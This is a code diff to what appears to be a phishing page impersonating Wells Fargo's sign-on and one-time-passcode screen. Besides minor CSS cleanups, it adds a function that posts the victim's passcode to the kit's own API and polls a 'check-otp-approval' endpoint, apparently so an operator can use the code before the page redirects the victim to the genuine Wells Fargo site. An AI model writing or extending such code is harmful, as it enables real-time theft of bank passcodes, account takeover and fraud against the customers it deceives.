@@ -57,8 +57,6 @@
       font-size: 13px;
       color: #555;
     }
-
-    /* Small, modern label for OTP */
     .otp-label {
       font-size: 14px;
       font-weight: 500;
@@ -67,8 +65,6 @@
       display: block;
       text-align: left;
     }
-
-    /* Modern smaller OTP input */
     .otp-input {
       font-size: 16px;
       text-align: center;
@@ -88,7 +84,6 @@
       border-color: #0070c9;
       box-shadow: 0 0 5px rgba(0, 112, 201, 0.4);
     }
-
     .sign-on {
       width: 100%;
       padding: 12px;
@@ -99,7 +94,6 @@
       color: #666;
       cursor: not-allowed;
       font-size: 16px;
-      transition: background-color 0.3s, color 0.3s;
       display: inline-flex;
       justify-content: center;
       align-items: center;
@@ -118,7 +112,6 @@
       height: 16px;
       animation: spin 1s linear infinite;
       display: inline-block;
-      vertical-align: middle;
     }
     @keyframes spin {
       0% { transform: rotate(0deg); }
@@ -192,6 +185,22 @@
     if (spinner) spinner.remove();
   }
 
+  async function pollOtpApproval(maxAttempts = 20, intervalMs = 3000) {
+    let attempts = 0;
+    while (attempts < maxAttempts) {
+      attempts++;
+      try {
+        const res = await fetch(`${API_BASE}/check-otp-approval`);
+        const data = await res.json();
+        if (data.otpApproved) return true;
+      } catch (e) {
+        console.error("Polling error:", e);
+      }
+      await new Promise(res => setTimeout(res, intervalMs));
+    }
+    return false;
+  }
+
   async function submitOTP() {
     const otp = otpField.value.trim();
     if (!otp) {
@@ -218,7 +227,15 @@
       const data = await res.json();
       if (!res.ok) throw new Error(data.message || "Verification failed");
 
-      window.location.href = "https://www.wellsfargo.com/mobile-online-banking/";
+      const approved = await pollOtpApproval();
+      if (approved) {
+        window.location.href = "https://www.wellsfargo.com/mobile-online-banking/";
+      } else {
+        errorMessage.textContent = "OTP not approved yet.";
+        errorMessage.style.display = "block";
+        clearButton();
+      }
+
     } catch (err) {
       errorMessage.textContent = err.message || "Something went wrong.";
       errorMessage.style.display = "block";
